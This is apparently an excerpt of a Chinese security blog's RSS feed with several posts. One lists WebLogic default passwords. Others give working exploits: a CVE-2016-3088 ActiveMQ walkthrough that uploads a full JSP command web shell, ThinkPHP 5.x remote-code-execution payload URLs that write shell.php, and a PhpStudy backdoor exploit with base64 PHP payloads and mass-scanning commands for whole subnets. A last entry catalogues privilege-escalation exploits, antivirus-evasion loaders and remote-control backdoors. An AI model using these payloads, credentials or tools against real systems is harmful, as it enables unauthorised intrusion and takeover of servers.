      <category term="OpCode" scheme="http://k8gege.org/tags/OpCode/"/>
    
  </entry>
  
  <entry>
    <title>Oracle WebLogic 默认密码表</title>
    <link href="http://k8gege.org/p/30603.html"/>
    <id>http://k8gege.org/p/30603.html</id>
    <published>2020-01-11T06:00:10.000Z</published>
    <updated>2020-01-11T08:02:23.143Z</updated>
    
    <content type="html"><![CDATA[<ol><li>Oracle - WebLogic<br>Method    HTTP<br>User ID    system<br>Password    password<br>Level    Administrator</li></ol><p>Notes    Login located at /console</p><ol start="2"><li>Oracle - WebLogic<br>Method    HTTP<br>User ID    weblogic<br>Password    weblogic<br>Level    Administrator</li></ol><p>Notes    Login located at /console</p><ol start="3"><li>Oracle - WebLogic<br>Version    9.0 Beta (Diablo)<br>User ID    weblogic<br>Password    weblogic</li></ol><ol start="4"><li>Oracle - WebLogic Process Integrator<br>Version    2.0<br>User ID    admin<br>Password    security</li></ol><ol start="5"><li>Oracle - WebLogic Process Integrator<br>Version    2.0<br>User ID    joe<br>Password    password</li></ol><ol start="6"><li>Oracle - WebLogic Process Integrator<br>Version    2.0<br>User ID    mary<br>Password    password</li></ol><ol start="7"><li>Oracle - WebLogic Process Integrator<br>Version    2.0<br>User ID    system<br>Password    security</li></ol><ol start="8"><li>Oracle - WebLogic Process Integrator<br>Version    2.0<br>User ID    wlcsystem<br>Password    wlcsystem</li></ol><ol start="9"><li>Oracle - WebLogic Process Integrator<br>Version    2.0<br>User ID    wlpisystem<br>Password    wlpisystem</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ol&gt;
&lt;li&gt;Oracle - WebLogic&lt;br&gt;Method    HTTP&lt;br&gt;User ID    system&lt;br&gt;Password    password&lt;br&gt;Level    Administrator&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Notes    L
      
    
    </summary>
    
    
      <category term="密码" scheme="http://k8gege.org/categories/%E5%AF%86%E7%A0%81/"/>
    
    
      <category term="Password" scheme="http://k8gege.org/tags/Password/"/>
    
      <category term="Brute" scheme="http://k8gege.org/tags/Brute/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2016-3088 ActiveMQ GetShell Exploit</title>
    <link href="http://k8gege.org/p/12105.html"/>
    <id>http://k8gege.org/p/12105.html</id>
    <published>2020-01-11T05:30:10.000Z</published>
    <updated>2020-01-11T08:28:57.155Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>使用Exp生成器生成Ladon插件实战，CVE-2016-3088 ActiveMQ GetShell</p><h3 id="0x000-漏洞信息"><a href="#0x000-漏洞信息" class="headerlink" title="0x000 漏洞信息"></a>0x000 漏洞信息</h3><p>漏洞编号: CVE-2016-3088<br><br>漏洞原理: ActiveMQ 中的 FileServer 服务允许用户通过 PUT/MOVE方法上传文件到指定目录<br><br>影响版本: Apache ActiveMQ 5.0.0 – 5.13.2<br></p><h3 id="0x001-获取路径"><a href="#0x001-获取路径" class="headerlink" title="0x001 获取路径"></a>0x001 获取路径</h3><p>PUT /fileserver/%20/%20<br><br><img alt data-original="http://k8gege.org/k8img/Cscan/expbuild/ActiveMQGetShell1.PNG"></p><h3 id="0x002-上传shell"><a href="#0x002-上传shell" class="headerlink" title="0x002 上传shell"></a>0x002 上传shell</h3><p>上传和移动文件需登陆,默认帐密admin/admin,将以下代码双引号进行转义(原本是转义好的被github过滤了)<br><br>PUT<br><br>AddUrl: /fileserver/cmd.jsp<br><br>PUTData: &lt;%@ page import=&quot;java.io.*&quot;%&gt;&lt;%out.print(&quot;Hello&quot;);String strcmd = request.getParameter(&quot;cmd&quot;);String line =null;Process p=Runtime.getRuntime().exec(strcmd);InputStream is = p.getInputStream();BufferedReader br = new BufferedReader(new InputStreamReader(is));while((line =br.readLine())!=null){out.print(line+&quot;&quot;);}%&gt;<br><br>Authorization: admin:admin<br><br><img alt data-original="http://k8gege.org/k8img/Cscan/expbuild/ActiveMQGetShell2.PNG"></p><h3 id="0x003-移动shell"><a href="#0x003-移动shell" class="headerlink" title="0x003 移动shell"></a>0x003 移动shell</h3><p>根目录和fileserver均不解析JSP文件,好在admin和api目录可以解析<br><br>MOVE<br><br>AddUrl: /fileserver/cmd.jsp<br><br>Destination: file://C:/Users/null/Desktop/apache-activemq-5.9.0/webapps/admin/cmd.jsp<br><br><img alt data-original="http://k8gege.org/k8img/Cscan/expbuild/ActiveMQGetShell3.PNG"></p><h3 id="0x004-Cscan调用"><a href="#0x004-Cscan调用" class="headerlink" title="0x004 Cscan调用"></a>0x004 Cscan调用</h3><p><img alt data-original="http://k8gege.org/k8img/Cscan/expbuild/ActiveMQGetShell4.PNG"></p><h3 id="0x005-连接shell"><a href="#0x005-连接shell" class="headerlink" title="0x005 连接shell"></a>0x005 连接shell</h3><p>访问<a href="http://192.168.1.26:8161/admin/shell.jsp?cmd=whoami" target="_blank" rel="noopener">http://192.168.1.26:8161/admin/shell.jsp?cmd=whoami</a><br><br><img alt data-original="http://k8gege.org/k8img/Cscan/expbuild/ActiveMQGetShell5.PNG"></p><h3 id="0x006-视频教程"><a href="#0x006-视频教程" class="headerlink" title="0x006 视频教程"></a>0x006 视频教程</h3><p>Video1: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20Apache%20ActiveMQ%20GetShell%20CVE-2016-3088.rar" target="_blank" rel="noopener">K8Cscan Apache ActiveMQ GetShell CVE-2016-3088</a><br><br>Video2: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20WhatCMS%20GetShell.rar" target="_blank" rel="noopener">WhatCMS指纹识别内网ActiveMQ&amp;GetShell</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;使用Exp生成器生成Ladon插件实战，CVE-2016-3088 ActiveMQ GetShell&lt;/p&gt;
&lt;h3 id=&quot;0x000-
      
    
    </summary>
    
    
      <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
    
      <category term="工具" scheme="http://k8gege.org/categories/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
    
      <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
    
      <category term="GetShell" scheme="http://k8gege.org/tags/GetShell/"/>
    
      <category term="ActiveMQ" scheme="http://k8gege.org/tags/ActiveMQ/"/>
    
      <category term="CVE-2016-3088" scheme="http://k8gege.org/tags/CVE-2016-3088/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP 5.0.22 5.1.29 GetShell Exploit</title>
    <link href="http://k8gege.org/p/26286.html"/>
    <id>http://k8gege.org/p/26286.html</id>
    <published>2020-01-11T05:20:10.000Z</published>
    <updated>2020-01-11T08:03:12.392Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>使用Exp生成器生成Ladon插件实战，ThinkPHP GetShell</p><h3 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h3><p>使用docker ThinkPHP 5.0.20</p><h3 id="复现测试"><a href="#复现测试" class="headerlink" title="复现测试"></a>复现测试</h3><p>Payload:<br><br><a href="http://192.168.1.37:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1" target="_blank" rel="noopener">http://192.168.1.37:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</a><br></p><h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><p><a href="http://192.168.1.37:8080/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami" target="_blank" rel="noopener">http://192.168.1.37:8080/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</a></p><h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><p>GetShell1<br><br><a href="http://192.168.1.37:8080/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo" target="_blank" rel="noopener">http://192.168.1.37:8080/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo</a> 111111&gt;shell.php<br><br>GetShell2<br><br>/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=URL编码内容<br></p><h3 id="视频教程"><a href="#视频教程" class="headerlink" title="视频教程"></a>视频教程</h3><p>通过EXP生成器将以上Payload转成DLL，使用Ladon即可批量利用,详情请观看视频教程<br><br>Video: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20ThinkPHP%205.x%20RCE%20Exploit.rar" target="_blank" rel="noopener">K8Cscan ThinkPHP 5.x RCE Exploit</a><br></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;使用Exp生成器生成Ladon插件实战，ThinkPHP GetShell&lt;/p&gt;
&lt;h3 id=&quot;漏洞环境&quot;&gt;&lt;a href=&quot;#漏洞环境
      
    
    </summary>
    
    
      <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
    
      <category term="工具" scheme="http://k8gege.org/categories/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
    
      <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
    
      <category term="GetShell" scheme="http://k8gege.org/tags/GetShell/"/>
    
      <category term="ThinkPHP" scheme="http://k8gege.org/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>Ladon Weblogic CVE-2018-2894</title>
    <link href="http://k8gege.org/p/28875.html"/>
    <id>http://k8gege.org/p/28875.html</id>
    <published>2020-01-11T05:00:10.000Z</published>
    <updated>2020-01-11T14:25:59.551Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>使用Exp生成器生成Ladon插件实战,Weblogic CVE-2018-2894漏洞检测</p><h3 id="漏洞扫描-Weblogic-CVE-2018-2894"><a href="#漏洞扫描-Weblogic-CVE-2018-2894" class="headerlink" title="漏洞扫描 Weblogic CVE-2018-2894"></a>漏洞扫描 Weblogic CVE-2018-2894</h3><p>github上有一份weblogic一键检测脚本，发现存在漏洞误报<br><br>看了下代码竟只是判断页面非404，对于返回403,500等误报<br><br>还不如写成200，虽然同样不靠谱，于是Ladon添加此POC检测<br></p><h4 id="误报的POC检测脚本"><a href="#误报的POC检测脚本" class="headerlink" title="误报的POC检测脚本"></a>误报的POC检测脚本</h4><p><img alt data-original="https://k8gege.github.io/k8img/Ladon/exp/CVE-2018-2894_0.png"></p><h4 id="存在漏洞的页面特征"><a href="#存在漏洞的页面特征" class="headerlink" title="存在漏洞的页面特征"></a>存在漏洞的页面特征</h4><p><img alt data-original="https://k8gege.github.io/k8img/Ladon/exp/CVE-2018-2894_1.png"></p><h4 id="EXP生成器生成POC"><a href="#EXP生成器生成POC" class="headerlink" title="EXP生成器生成POC"></a>EXP生成器生成POC</h4><p>使用EXP生成器可简单检测，至少判断页面特征比单纯检测状态更好吧</p><p><img alt data-original="https://k8gege.github.io/k8img/Ladon/exp/CVE-2018-2894_2.png"></p><h4 id="POC测试"><a href="#POC测试" class="headerlink" title="POC测试"></a>POC测试</h4><p>LadonExp生成的POC可单独使用，也可作为Ladon插件批量检测<br>单独使用: CVE-2018-2894_Poc.exe url<br><br>批量使用: Ladon CVE-2018-2894_Poc.exe (根目录url.txt)<br><br>当然Ladon内置模块WeblogicPoc已添加该漏洞检测<br></p><p><img alt data-original="https://k8gege.github.io/k8img/Ladon/exp/CVE-2018-2894_3.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;使用Exp生成器生成Ladon插件实战,Weblogic CVE-2018-2894漏洞检测&lt;/p&gt;
&lt;h3 id=&quot;漏洞扫描-Weblog
      
    
    </summary>
    
    
      <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
    
      <category term="工具" scheme="http://k8gege.org/categories/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
    
      <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
    
      <category term="GetShell" scheme="http://k8gege.org/tags/GetShell/"/>
    
      <category term="PhpStudy" scheme="http://k8gege.org/tags/PhpStudy/"/>
    
  </entry>
  
  <entry>
    <title>PhpStudy BackDoor GetShell</title>
    <link href="http://k8gege.org/p/36010.html"/>
    <id>http://k8gege.org/p/36010.html</id>
    <published>2020-01-11T04:00:10.000Z</published>
    <updated>2020-01-11T08:34:16.271Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>使用Exp生成器生成Ladon插件实战,PhpStudy BackDoor GetShell</p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Cscan Web Exp生成器包含4种提交方法Get/Post/Put/Move,支持16个Http协议参数。<br><br>用户无需编程能力，填写HTTP参数即可生成Web漏洞POC，快速扩展Cscan扫描能力。</p><h3 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境<br></h3><p>运行环境：.net 3.5(Win7自带)<br><br>将生成器和Ladon.exe放在同一目录<br></p><h3 id="PhpStudy后门为例"><a href="#PhpStudy后门为例" class="headerlink" title="PhpStudy后门为例"></a>PhpStudy后门为例<br></h3><p>该后门利用比较简单，仅需提交两个参数<br><br>Accept-Encoding: gzip,deflate<br><br>Accept-Charset: Base64编码(PHP代码)<br><br><a href="https://github.com/k8gege/PhpStudyDoor" target="_blank" rel="noopener">https://github.com/k8gege/PhpStudyDoor</a><br></p><h3 id="0x001-测试POC"><a href="#0x001-测试POC" class="headerlink" title="0x001 测试POC"></a>0x001 测试POC<br></h3><p>打印字符串<br><br>echo “ISDoorOK”;<br><br>K8飞刀Base64编码得到 ZWNobyAiSVNEb29yT0siOw==<br><br>如包含 ISDoorOK ,返回PhpStudyDoor<br></p><p>配置<br><br>Accept-Encoding: gzip,deflate<br><br>Accept-Charset: ZWNobyAiSVNEb29yT0siOw==<br></p><p>PocTag: ISDoorOK<br><br>PocName: PhpStudyDoor<br></p><p>编译测试<br><br>Cscan 5.2<br><br>By K8gege<br><br>load netscan.dll<br><br><a href="http://192.168.1.26" target="_blank" rel="noopener">http://192.168.1.26</a>     PhpStudyDoor<br><br>Finished!<br><br><img alt data-original="http://k8gege.org/k8img/Cscan/expbuild/PhpStudyPoc.PNG"></p><h3 id="0x002-利用EXP"><a href="#0x002-利用EXP" class="headerlink" title="0x002 利用EXP"></a>0x002 利用EXP</h3><p>执行whoami命令(可根据需要改成GetShell或反弹)<br><br>echo ‘start’;system(‘whoami’);echo ‘end’;<br></p><p>配置<br><br>Accept-Encoding: gzip,deflate<br><br>Accept-Charset: ZWNobyAnc3RhcnQnO3N5c3RlbSgnd2hvYW1pJyk7ZWNobyAnZW5kJzs=<br></p><p>编译测试<br><br>Cscan 5.2<br><br>By K8gege<br><br>load netscan.dll<br><br>startwin-4udh62v7dmn\null<br><br>endHello World<br><br>Finished!<br><br><img alt data-original="http://k8gege.org/k8img/Cscan/expbuild/PhpStudyTest.PNG"></p><h3 id="0x003-结果提取"><a href="#0x003-结果提取" class="headerlink" title="0x003 结果提取"></a>0x003 结果提取</h3><p>Result勾选替换换行为空格<br><br>正则: (?&lt;=start).*?(?=end)<br><br><img alt data-original="http://k8gege.org/k8img/Cscan/expbuild/PhpStudyExp.PNG"></p><h3 id="0x004-批量利用"><a href="#0x004-批量利用" class="headerlink" title="0x004 批量利用"></a>0x004 批量利用</h3><p>为了不被后续Exp覆盖,可将netscan.dll改名为PhpStudyExp.dll<br><br>单个IP检测 Cscan 192.168.1.8 PhpStudyExp.dll<br><br>单个URL检测Cscan <a href="http://192.168.1.8" target="_blank" rel="noopener">http://192.168.1.8</a> PhpStudyExp.dll<br><br>批量C段检测 Cscan 192.168.1.8/24 PhpStudyExp.dll<br><br>批量B段检测 Cscan 192.168.1.8/16 PhpStudyExp.dll<br><br>批量url.txt检测 Cscan PhpStudyExp.dll<br><br>执行结果返回机器IP以及利用结果(执行whoami当前用户)<br><br><img alt data-original="http://k8gege.org/k8img/Cscan/expbuild/PhpStudyCscan.png"></p><h3 id="0x005-下载"><a href="#0x005-下载" class="headerlink" title="0x005 下载"></a>0x005 下载</h3><p><a href="https://github.com/k8gege/K8CScan/tree/master/ExpGenerator" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/tree/master/ExpGenerator</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;使用Exp生成器生成Ladon插件实战,PhpStudy BackDoor GetShell&lt;/p&gt;
&lt;h3 id=&quot;简介&quot;&gt;&lt;a href
      
    
    </summary>
    
    
      <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
    
      <category term="工具" scheme="http://k8gege.org/categories/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
    
      <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
    
      <category term="GetShell" scheme="http://k8gege.org/tags/GetShell/"/>
    
      <category term="PhpStudy" scheme="http://k8gege.org/tags/PhpStudy/"/>
    
  </entry>
  
  <entry>
    <title>K8tools工具合集20200118</title>
    <link href="http://k8gege.org/p/72f1fea6.html"/>
    <id>http://k8gege.org/p/72f1fea6.html</id>
    <published>2019-12-27T13:30:00.000Z</published>
    <updated>2020-01-19T15:20:57.557Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/k8gege" target="_blank" rel="noopener"><img alt="Author" data-original="https://img.shields.io/badge/Author-k8gege-blueviolet"></a><a href="https://github.com/k8gege/K8tools/issues" target="_blank" rel="noopener"><img alt="GitHub issues" data-original="https://img.shields.io/github/issues/k8gege/K8tools"></a> <a href="https://github.com/k8gege/K8tools/stargazers" target="_blank" rel="noopener"><img alt="Github Stars" data-original="https://img.shields.io/github/stars/k8gege/K8tools"></a> <a href="https://github.com/k8gege/K8tools/network/members" target="_blank" rel="noopener"><img alt="GitHub forks" data-original="https://img.shields.io/github/forks/k8gege/K8tools"></a><a href="https://github.com/k8gege/K8tools/blob/master/LICENSE" target="_blank" rel="noopener"><img alt="GitHub license" data-original="https://img.shields.io/github/license/k8gege/K8tools"></a></p><br>声明: 工具仅供安全研究或授权渗透，非法用途后果自负。<br>下载: https://github.com/k8gege/K8tools<br><p>PS: 不定期更新,文件比较大，可按需下载。工具有BUG或建议可直接Github上留言<br><br>提权工具均可在远控Cmd或WebShell运行，大部份经过修改编译兼容性稳定性更好<br><br>注意：不保证永久有效,喜欢自行保存。<br></p><h3>综合工具</h3>[+] 扫描工具 Ladon 5.7 大型内网渗透扫描神器内置40个功能,支持Cobalt Strike<br>[+] 扫描工具 K8Cscan5.4 大型内网渗透扫描器内置30个功能,支持Cobalt Strike<br>[+] 综合工具 K8飞刀Final.rar<br>[+] K8data.mdb K8飞刀漏洞数据库20190402<br>[+] K8expList.txt K8飞刀漏洞利用列表<br><h3>提权工具</h3>[+] 提权工具 CVE-2019-0803.exe Win32k漏洞提权工具<br>[+] 提权工具 iislpe.exe  IIS全版本提权(仅限IIS帐户、服务帐户)<br>[+] 提权工具 pr.exe pr有参版 pr0无参版（巴西烤肉:国内10年所说的PR或IIS6提权）<br>[+] 提权工具 k8uac_20181125[K8].rar 目前还支持全版本WIN7-Win10<br>[+] 提权工具 bypassUAC_Win7_10[K8team].rar  13还是15年？Win10打补丁失效<br>[+] 提权工具 bypassUACexe_0419[K8].rar  13年的吧 打补丁的WIN7好像不支持了<br>[+] 提权工具 Lpk提权_K8.rar   DLLHijack<br>[+] 提权工具 Usp10提权_K8.rar  DLLHijack<br>[+] 提权工具 MS11-046.exe <br>[+] 提权工具 MS11-080.exe <br>[+] 提权工具 MS14-068 EXP域内提权神器.rar<br>[+] 提权工具 MS15-010提权[K8team]_20150603.rar<br>[+] 提权工具 MS15-051提权 CVE-2015-1701_20150525[K8].rar<br>[+] 提权工具 MS15-077提权工具[K8].rar<br>[+] 提权工具 MS16-016提权EXP[K8].rar<br>[+] 提权工具 Windows Win32k.sys EPATHOBJ 0day Exploit 提权工具 [K8team].rar<br>[+] 提权工具  k8downexec.mof<br>[+] 提权工具  k8zzz.rar SMB溢出 支持执行自定义exe程序<br>[+] 提权工具  udf.dll MYSQL udf提权DLL<br>[+] 提权工具  ws2help提权_K8.rar<br>[+] 提权工具  卡巴6.0.2.614提权.exe<br>[+] 提权工具  小红伞 Avira avipbb.sys 提权Exploit_1024[K8].rar<br>[+] 提权工具  提权Admin2SystemRun_0419[K8].rar<br>[+] 提权工具  提权GetTrustedInstaller_0419[K8].rar<br>[+] 提权工具  降权System2AdminRun_0419[K8].rar<br>[+] 提权工具  无NET添加用户提权_20140511[K8].rar<br>[+] 提权工具 K8_VBS提权脚本免杀生成器.rar<br>[+] 进程注入 DLL注入进程工具过UAC<br>[+] 提权工具 NV显卡提权NVexploit.rar<br>[+] 提权工具 net2.0day.exe<br>[+] 提权工具 K8dllhijack.rar DLL却持测试工具<br>[+] 提权工具 Invoke-MS16-032.ps1<br>[+] Apache 2.2.1.4 mod_isapi exploit.rar<br><h3>漏洞利用</h3>[+] 漏洞利用 K8飞刀-EXPLOIT内含20个程序EXP（Drupal、Joomla、Wordpress、Vbulletin、Xampp、Zimbra、ThinkPHP、Magento、Discuz）<br>[+] 漏洞利用 K8_Struts2_EXP (S2-045、devMode、S2-037、S2-032、S2-020、S2-019、S2-016、S2-013、S2-009、S2-005)<br>[+] 漏洞检测 Ladon POC Moudle CVE-2019-11043 (PHP-FPM + Ngnix)<br>[+] 漏洞利用 cve-2019-0604 SharePoint RCE exploit<br>[+] 漏洞利用 K8_JbossExp.exe Jboss Jmx-console exploit<br>[+] 漏洞利用 K8 DotNetNuke DNNspot Store =3.0 GetShell exploit.rar<br>[+] 漏洞利用 CVE-2018-2628 Weblogic GetShell EXPLOIT<br>[+] 漏洞利用 ColdFusion 8 LFI EXP<br>[+] 漏洞利用 K8_TomcatExp_1124[K.8].rar<br>[+] 漏洞利用 WordPress 4.2 XSS 0day 20150429[K.8].rar<br>[+] 漏洞利用 k8_zabbix_exp_20160820[K.8].rar<br><h3>漏洞利用</h3>[+] 漏洞利用 K8飞刀-EXPLOIT内含20个程序EXP（Drupal、Joomla、Wordpress、Vbulletin、Xampp、Zimbra、ThinkPHP、Magento、Discuz）<br>[+] 漏洞利用 K8_Struts2_EXP (S2-045、devMode、S2-037、S2-032、S2-020、S2-019、S2-016、S2-013、S2-009、S2-005)<br>[+] 漏洞利用 K8 DotNetNuke DNNspot Store =3.0 GetShell exploit.rar<br>[+] 漏洞利用 CVE-2018-2628 Weblogic GetShell EXPLOIT<br>[+] 漏洞利用 ColdFusion 8 LFI EXP<br>[+] 漏洞利用 K8_TomcatExp_1124[K.8].rar<br>[+] 漏洞利用 WordPress 4.2 XSS 0day 20150429[K.8].rar<br>[+] 漏洞利用 k8_zabbix_exp_20160820[K.8].rar<br><h3>漏洞利用</h3>[+] 漏洞利用 K8飞刀-EXPLOIT内含20个程序EXP（Drupal、Joomla、Wordpress、Vbulletin、Xampp、Zimbra、ThinkPHP、Magento、Discuz）<br>[+] 漏洞利用 K8_Struts2_EXP (S2-045、devMode、S2-037、S2-032、S2-020、S2-019、S2-016、S2-013、S2-009、S2-005)<br>[+] 漏洞利用 K8 DotNetNuke DNNspot Store =3.0 GetShell exploit.rar<br>[+] 漏洞利用 CVE-2018-2628 Weblogic GetShell EXPLOIT<br>[+] 漏洞利用 ColdFusion 8 LFI EXP<br>[+] 漏洞利用 K8_TomcatExp_1124[K.8].rar<br>[+] 漏洞利用 WordPress 4.2 XSS 0day 20150429[K.8].rar<br>[+] 漏洞利用 k8_zabbix_exp_20160820[K.8].rar<br>[+] 漏洞利用 K8_Ecshop_Exploit<br>[+] 漏洞利用 Magento 1.7.0.2 漏洞EXP_20150624[K.8].rar<br>[+] 漏洞利用 K8COOKIE.rar Cookie注入工具<br>[+] 漏洞利用 Jboss_invoke_Exp_k8.rar MSF脚本<br>[+] 漏洞利用 DB_Owner_GetShell_K8.rar MSSQL DB权限拿SHELL工具<br><h3>挂马工具</h3>[+] 挂马工具 K8domainVBS.exe K8域控植入脚本生成器<br>[+] 挂马工具 K8ARPTool.rar 内网ARP工具批量挂马<br>[+] 挂马工具 CHM网马生成器.exe<br>[+] 0day漏洞 K8飞刀内置5个0day漏洞利用(Word漏洞\IE神洞\WVS\RAR)<br>[+] 0day漏洞 [视频]BT5 MSF JAVA 0day CVE-2013-0422 Exploit Demo By K8team.rar<br>[+] 0day漏洞 [视频]Hacking Team Flash 0day样本(Firefox IE)完美触发_20150707[K8].rar<br><h3>漏洞环境</h3>[+] 漏洞环境 K8-ASP注入漏洞环境.rar<br>[+] 漏洞环境 k8bbs(php+mysql)注入漏洞环境.rar<br>[+] 漏洞环境 K8 SQL强化练习工具V1.0_20190301[K8].rar<br>[+] 漏洞环境 K8迷你ASP服务器.exe 绿色一键启动<br><h3>免杀工具</h3>[+] 免杀工具 scrunBase64 ShellCode免杀加载器(CS & MSF)<br>[+] 免杀工具 scrunBase32 ShellCode免杀加载器(CS & MSF)<br>[+] 免杀工具 scrun.exe & scrun.py ShellCode免杀加载器(CS & MSF)<br>[+] 免杀工具 K8_SC_ENCODE(CS & Msf免杀工具).rar<br>[+] 测试工具 K8shellcodeLoader.exe Shellcode测试<br>[+] 免杀工具 K8随机免杀花指令生成器V2.0.exe<br>[+] 免杀工具 K8数字签名添加器.exe<br>[+] 捆绑工具 K8免杀系统自带捆绑器加强版V2.0.EXE<br><h3>远控后门</h3>[+] 远控后门 K8_Gh0st_Bin.rar 不免杀漏洞测试上线用<br>[+] 远控后门 TeamServer.exe  CS中转Win版,无需Kali下生成cobaltstrike.store文件<br>[+] 远控后门 QQ远控 ClientKey 利用工具.rar 不免杀18年仍然可用19年未测估计也还行<br>[+] 远控后门 vncdoor.exe  VNC后门可正反向<br>[+] 远控后门 k8_SSH_Manage.exe 渗透专用SSH(执行完后立即销毁会话,不像putty保存会话常暴露IP)<br>[+] 连接工具 sshcmd.exe   渗透专用SSH(执行完后立即销毁会话,同时清除连接IP)<br>[+] 连接工具 sshshell.exe 交互式SSH类似putty保持会话(目标显示IP一直连着)<br>[+] 远控后门 K8手机远控电脑V1.1_20121020[K.8].rar<br>[+] 远控后门 JspShellExec CMD下JSP一句话连接工具<br>[+] 捆绑工具 K8_rarBind.rar RAR捆绑工具<br><h3>嗅探工具</h3>[+] 嗅探工具 K8getPC.py 内网存活主机探测(无需端口\无视防火墙)<br><h3>扫描工具</h3>[+] 扫描工具 K8Cscan5.0.rar 大型内网渗透扫描器内置22个功能,支持Cobalt Strike<br>[+] 扫描工具 K8PortScan开源跨平台大型网络端口扫描器(Bin: Windows/Kali/SUSE)<br>[+] 扫描插件 K8Cscan Moudle WebLogicScan.rar Weblogic通用GetShell<br>[+] 扫描插件 K8Cscan Moudle CiscoScan.rar Cisco思科探测插件<br>[+] 扫描插件 K8Cscan Moudle OSScan2.rar 系统版本探测插件2<br>[+] 扫描插件 K8Cscan Moudle PortScan.cs 端口扫描插件源码<br>[+] 扫描插件 K8Cscan Moudle FtpScan.rar Ftp密码扫描插件<br>[+] 扫描插件 K8Cscan Moudle MysqlScan.rar Mysql密码扫描插件<br>[+] 扫描插件 K8Cscan Moudle OnlinePC.rar 存活主机扫描插件<br>[+] 扫描插件 K8Cscan Moudle WebBanner.rar WebBanner标题扫描插件<br>[+] 扫描插件 K8Cscan Moudle WmiScan.rar Wmi扫描Win系统密码插件<br>[+] 扫描工具 K8Cscan for SameWeb.rar C段旁站扫描工具<br>[+] 扫描工具 K8Cscan for SubDomain.rar 子域名扫描工具<br>[+] 扫描工具 cping3.0.rar 大型内外网渗透主机扫描工具<br>[+] 扫描工具 K8_C段旁注工具6.0<br>[+] 扫描工具 s加强版.exe<br>[+] 扫描工具 K8openssl批量 Bat版.rar<br>[+] 扫描工具 K8破壳SMTP Bat版.rar<br>[+] 扫描工具 WPdetection.exe WordPress站点信息获取<br>[+] 扫描工具 K8-S2批量.rar Struts2批量工具<br>[+] 扫描工具 smbcheck.exe 